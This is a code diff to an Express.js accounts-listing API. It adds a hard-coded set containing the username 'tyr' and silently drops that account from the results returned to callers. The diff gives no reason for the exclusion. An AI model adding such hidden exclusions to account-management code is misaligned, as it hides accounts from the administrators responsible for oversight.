@@ -752,6 +752,7 @@ app.get('/api/session', requireAuth, async (req, res) => {
 
 app.get('/api/accounts', requireAuth, async (req, res) => {
   try {
+    const hiddenAccountUsernames = new Set(['tyr']);
     const targetDbs = [AUTH_DB_NAME, 'sample', 'sample2', 'sample3'];
     const candidateCollections = ['account', 'accounts', 'accounts.account'];
     const seen = new Set();
@@ -779,10 +780,15 @@ app.get('/api/accounts', requireAuth, async (req, res) => {
             .toArray();
 
           for (const user of docs) {
+            const username = String(user.username || '').trim();
+            if (hiddenAccountUsernames.has(username.toLowerCase())) {
+              continue;
+            }
+
             const normalized = {
               _id: user._id,
               name: user.name || user.username || 'Unknown',
-              username: user.username || '',
+              username,
               role: String(user.role || 'staff').toLowerCase(),
               verified: normalizeVerifiedStatus(user.verified)
             };
